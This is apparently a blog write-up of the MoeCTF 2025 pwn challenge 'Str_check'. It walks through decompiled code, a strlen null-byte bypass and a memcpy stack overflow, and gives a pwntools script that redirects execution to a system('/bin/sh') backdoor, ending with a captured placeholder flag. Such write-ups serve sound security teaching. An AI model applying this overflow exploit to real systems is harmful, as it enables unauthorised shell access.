---
title: 'XiDianCTF MoeCTF 2025 PWN Str_check'
date: '2026-09-05T09:24:45+08:00'
lastmod: '2026-09-05T09:24:45+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
The original Chinese article was written by a human and only proofread with generative AI. This English version was translated with AI.
```

[Challenge link](https://ctf.xidian.edu.cn/training/22?challenge=863)

Once again, open the binary in IDA.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char dest[24]; // [rsp+0h] [rbp-20h] BYREF
  size_t n; // [rsp+18h] [rbp-8h] BYREF

  init(argc, argv, envp);
  puts("What can u say?");
  __isoc99_scanf("%255s", str);
  puts("So,what size is it?");
  __isoc99_scanf("%zu", &n);
  len = strlen(str);
  if ( (unsigned __int64)len > 0x18 )
  {
    puts("Oh,too much.");
    exit(1);
  }
  if ( !strncmp(str, "meow", 4uLL) )
    memcpy(dest, str, n);
  else
    strncpy(dest, str, n);
  puts("You're right.");
  return 0;
}
```

> Notice that `strlen()` is used here to enforce a maximum length of `0x18`.
>
> However, `strlen()` stops at the first `\0` (which is not included in the length), and the user-supplied length `n` is not checked separately.
>
> We can therefore place a `\0` within the first `0x19` bytes to bypass the check.



Furthermore:

>     memcpy(dest, str, n);
>     strncpy(dest, str, n);
> `strncpy` stops copying as soon as it encounters `\0`.
>
> Therefore, we need the `memcpy` branch, which requires the first four characters of `str` to be `meow`.



Looking more closely, we find:

```c
int backdoor()
{
  return system("/bin/sh");
}
```

This looks like a classic stack overflow that overwrites the return address.

We therefore need to craft the string and `n` so that they overwrite the function's return address.



```assembly
text:0000000000401236 ; int backdoor()
.text:0000000000401236                 public backdoor
.text:0000000000401236 backdoor        proc near
.text:0000000000401236 ; __unwind {
.text:0000000000401236                 endbr64
.text:000000000040123A                 push    rbp
.text:000000000040123B                 mov     rbp, rsp
.text:000000000040123E                 lea     rax, command    ; "/bin/sh"
.text:0000000000401245                 mov     rdi, rax        ; command
.text:0000000000401248                 call    _system
.text:000000000040124D                 nop
.text:000000000040124E                 pop     rbp
.text:000000000040124F                 retn
.text:000000000040124F ; } // starts at 401236
.text:000000000040124F backdoor        endp
```

The target address is `0x40123E`.



Construct the first `0x18` bytes as `b'meow' + b'\0' * (0x18 - 0x4)`.

The overflow also overwrites `n`, so after the first `0x18` bytes we place an eight-byte value produced by `p64()`.

Next come eight arbitrary padding bytes, followed by the target address packed with `p64()`.



Pwntools script:

 ```python
 from pwn import *
 import ctypes
 context(arch='amd64', os='linux', log_level='info')
 
 io = connect("127.0.0.1", 24461)
 
 
 add = 0x40123e
 
 io.sendline(b'meow' + b'\0' * 0x14 + p64(0x18 + 0x8 + 0x8 + 0x8)  + b'A' * 8 + p64(add))
 
 io.sendline(str(0x18 + 0x18).encode())
 
 io.interactive()
 ```



Output:

```
[x] Opening connection to 127.0.0.1 on port 24461
[x] Opening connection to 127.0.0.1 on port 24461: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 24461: Done
[*] Switching to interactive mode
What can u say?
So,what size is it?
You're right.
cat flag
moectf{THIS_IS_FLAG}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 24461
```

